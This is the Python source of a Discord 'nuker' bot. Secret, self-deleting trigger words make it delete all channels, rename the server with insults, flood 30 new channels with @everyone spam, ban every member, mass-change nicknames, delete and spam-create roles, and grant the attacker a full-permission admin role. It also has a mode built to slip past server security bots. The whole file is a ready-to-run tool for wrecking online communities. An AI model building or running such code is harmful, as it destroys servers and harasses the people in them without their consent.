import discord
import asyncio
import aiohttp
import os
from colorama import init, Fore, Style
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)


init(autoreset=True)

TRIGGER_NUKE = "xnuke"
TRIGGER_ICON = "xsp"
STOP_TRIGGER = "xstop"
SPAM_CHANNEL_NAME = "BOBO-BA-KAYO"
SPAM_MESSAGE = "# tanga NA NUKE @everyone @here"
NEW_SERVER_NAME = "KANTOT-KAYO-SAKIN"
MAX_CHANNELS = 30
ICON_URL = ""

intents = discord.Intents.all()
bot = discord.Client(intents=intents)

active_nukes = {}
spamming = {}
icon_bytes = None

def log_sent(message, channel_name):
    print(f"{Fore.RED}[+] message sent ({channel_name}){Style.RESET_ALL}")

def log_deleted(channel_name):
    print(f"{Fore.RED}[-] channel deleted ({channel_name}){Style.RESET_ALL}")

def log_role_created(role_name):
    print(f"{Fore.RED}[+] role created ({role_name}){Style.RESET_ALL}")

def log_role_deleted(role_name):
    print(f"{Fore.RED}[-] role deleted ({role_name}){Style.RESET_ALL}")
def log_nickname_changed(user_name, nickname):
    print(f"{Fore.RED}[+] change nickname ({user_name}) to ({nickname}){Style.RESET_ALL}")

def log_banned(user_name):
    print(f"{Fore.RED}[ ! ] banned ({user_name}){Style.RESET_ALL}")

def log_admin_given(user_name):
    print(f"{Fore.RED}[+] gave admin ({user_name}){Style.RESET_ALL}")

async def fetch_icon():
    global icon_bytes
    if icon_bytes:
        return icon_bytes
    async with aiohttp.ClientSession() as session:
        async with session.get(ICON_URL) as resp:
            if resp.status == 200:
                icon_bytes = await resp.read()
                print("Icon downloaded.")
                return icon_bytes
    return None

async def spam_channel_loop(channel, guild_id):
    while spamming.get(guild_id, False):
        try:
            await channel.send(SPAM_MESSAGE)
            log_sent(SPAM_MESSAGE, channel.name)
        except discord.HTTPException as e:
            if e.status == 429:
                print(f"Rate limited in {channel.name}, sleeping...")
                await asyncio.sleep(2.5)
            else:
                print(f"HTTP error in {channel.name}: {e}")
        except Exception as e:
            print(f"Spam failed in {channel.name}: {e}")
        await asyncio.sleep(0.1)

async def delete_all_channels(guild):
    delete_tasks = [channel.delete() for channel in guild.channels]
    results = await asyncio.gather(*delete_tasks, return_exceptions=True)
    for i, res in enumerate(results):
        if not isinstance(res, Exception):
            try:
                channel_name = guild.channels[i].name
            except:
                channel_name = f"Channel-{i}"
            log_deleted(channel_name)
    print("Channels deleted.")

async def start_nuke(guild):
    if active_nukes.get(guild.id):
        return
    active_nukes[guild.id] = True
    spamming[guild.id] = False

    try:
        await guild.edit(name=NEW_SERVER_NAME)
        print("Server renamed.")
    except Exception as e:
        print(f"Rename failed: {e}")

    await delete_all_channels(guild)
    spamming[guild.id] = True

    async def create_and_spam():
        tasks = [asyncio.create_task(guild.create_text_channel(SPAM_CHANNEL_NAME)) for _ in range(MAX_CHANNELS)]
        for coro in asyncio.as_completed(tasks):
            try:
                channel = await coro
                print(f"Created channel: {channel.name}")
                asyncio.create_task(spam_channel_loop(channel, guild.id))
            except Exception as e:
                print(f"Channel creation failed: {e}")
    await create_and_spam()

async def change_icon(guild):
    icon = await fetch_icon()
    if icon:
        try:
            await guild.edit(icon=icon)
            print("Icon changed.")
        except Exception as e:
            print(f"Icon change failed: {e}")

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{Fore.RED}
                           

███████╗██████╗░░█████╗░███╗░░░███╗███████╗░██╗░░░░░░░██╗░█████╗░██████╗░██╗░░██╗
██╔════╝██╔══██╗██╔══██╗████╗░████║██╔════╝░██║░░██╗░░██║██╔══██╗██╔══██╗██║░██╔╝
█████╗░░██████╔╝███████║██╔████╔██║█████╗░░░╚██╗████╗██╔╝██║░░██║██████╔╝█████═╝░
██╔══╝░░██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝░░░░████╔═████║░██║░░██║██╔══██╗██╔═██╗░
██║░░░░░██║░░██║██║░░██║██║░╚═╝░██║███████╗░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██║░╚██╗
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝
                                  
                                                      
                                                      
                                      
                                      
                                      
{Style.RESET_ALL}""")

    print(f"{Fore.RED}[+] Bot online ({bot.user}){Style.RESET_ALL}")
    print(f"""{Fore.RED}
╭─────────────────────────────────────╮
│             FRAMEWORK               |
│                                     |
│  discord: dxrkszx.                  |
│  discord sv: discord.gg/framework   |
╰─────────────────────────────────────╯
{Style.RESET_ALL}""")

    print(f"""{Fore.RED}
COMMANDS “x”

xnuke       - Start nuking the server
xsp         - Change the server icon
xstop       - Stop all spamming
xuser       - Change all nicknames
xban        - Ban all members 
xadmin      - Create and assign an admin role
xdelroles   - Delete roles below the bot's top role
xspamroles  - Spam create 
xnukerbypass - Mild nuker to bypass security bot
{Style.RESET_ALL}""")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    content = message.content.lower()
    guild = message.guild

    if content == TRIGGER_NUKE:
        try:
            await message.delete()
        except:
            pass
        print(f"Nuke triggered in {guild.id}")
        await start_nuke(guild)

    elif content == TRIGGER_ICON:
        try:
            await message.delete()
        except:
            pass
        print(f"Icon trigger in {guild.id}")
        await change_icon(guild)

    elif content == STOP_TRIGGER:
        spamming[guild.id] = False
        active_nukes[guild.id] = False
        print(f"Nuke stopped in {guild.id}")

    elif content == "xuser":
        try:
            await message.delete()
        except:
            pass
        print(f"Nickname change triggered in {guild.id}")
        async def change_nicknames():
            tasks = []
            for member in guild.members:
                if member != guild.owner and not member.bot:
                    tasks.append(member.edit(nick=".gg/forty"))
            await asyncio.gather(*tasks, return_exceptions=True)
            for member in guild.members:
                if member != guild.owner and not member.bot:
                    log_nickname_changed(member.name, ".gg/forty")
        await change_nicknames()

    elif content == "xban":
        try:
            await message.delete()
        except:
            pass
        print(f"Ban triggered in {guild.id}")
        async def ban_all():
            for member in guild.members:
                if member != guild.owner and not member.bot:
                    try:
                        await member.ban(reason="forty was here")
                        log_banned(member.name)
                        await asyncio.sleep(0.3)
                    except Exception as e:
                        print(f"Failed to ban {member}: {e}")
                        await asyncio.sleep(1.0)
            print("Ban wave complete.")
        await ban_all()

    elif content == "xadmin":
        try:
            await message.delete()
        except:
            pass
        print(f"Admin role trigger in {guild.id}")
        async def give_admin():
            me = guild.me
            author = message.author
            if not me.guild_permissions.manage_roles:
                print("Bot lacks Manage Roles permission.")
                return
            bot_top_role = max(me.roles, key=lambda r: r.position)
            perms = discord.Permissions.all()
            try:
                admin_role = await guild.create_role(name="FORTY_ADMIN", permissions=perms)
                print("Admin role created with full permissions.")
            except discord.Forbidden:
                perms.update(
                    manage_channels=True,
                    manage_roles=True,
                    manage_guild=True,
                    ban_members=True,
                    kick_members=True,
                    view_audit_log=True,
                    mention_everyone=True,
                    manage_messages=True,
                    manage_webhooks=True,
                    manage_emojis=True
                )
                admin_role = await guild.create_role(name="FORTY_ADMIN", permissions=perms)
                print("Admin role created with limited permissions.")
            await admin_role.edit(position=bot_top_role.position + 1)
            await author.add_roles(admin_role)
            log_admin_given(author.name)
        await give_admin()

    elif content == "xdelroles":
        try:
            await message.delete()
        except:
            pass
        print(f"Deleting roles in {guild.id}")
        async def delete_roles():
            me = guild.me
            bot_top_role_pos = max(me.roles, key=lambda r: r.position).position
            for role in guild.roles:
                if role.position < bot_top_role_pos and role != guild.default_role:
                    try:
                        await role.delete()
                        log_role_deleted(role.name)
                    except Exception as e:
                        print(f"Failed to delete role {role.name}: {e}")
        await delete_roles()

    elif content == "xspamroles":
        try:
            await message.delete()
        except:
            pass
        print(f"Spamming roles in {guild.id}")
        async def spam_roles():
            for i in range(50):
                try:
                    role = await guild.create_role(name="HOLY")
                    log_role_created(role.name)
                    await asyncio.sleep(0.01)
                except Exception as e:
                    print(f"Failed to create role: {e}")
        await spam_roles()

    elif content == "xnukerbypass":
        try:
            await message.delete()
        except:
            pass
        print(f"Nuker bypass triggered in {guild.id}")
        try:
            await guild.edit(name=NEW_SERVER_NAME)
            print("Server renamed (bypass).")
        except Exception as e:
            print(f"Rename failed (bypass): {e}")
        for channel in guild.channels:
            try:
                await channel.delete()
                log_deleted(channel.name)
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Failed to delete channel {channel.name} (bypass): {e}")
            

bot.run(TOKEN)
